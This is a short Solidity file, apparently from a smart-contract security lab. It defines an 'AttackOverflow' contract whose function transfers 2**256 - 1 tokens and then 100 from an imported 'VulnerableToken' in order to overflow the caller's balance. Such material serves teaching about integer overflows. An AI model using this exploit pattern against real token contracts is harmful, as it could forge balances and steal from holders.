// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./VulnerableToken.sol";

contract AttackOverflow {
    VulnerableToken public vulnerableToken;

    constructor(address _vulnerableTokenAddress) {
        vulnerableToken = VulnerableToken(_vulnerableTokenAddress);
    }


    // Trigger an overflow on attacker's balance
    function exploitOverflow() public {
        // Transfer tokens to trigger overflow by exceeding the maximum uint256 value
        vulnerableToken.transfer(msg.sender, 2**256 - 1); 
        vulnerableToken.transfer(msg.sender, 100); 
    }
}
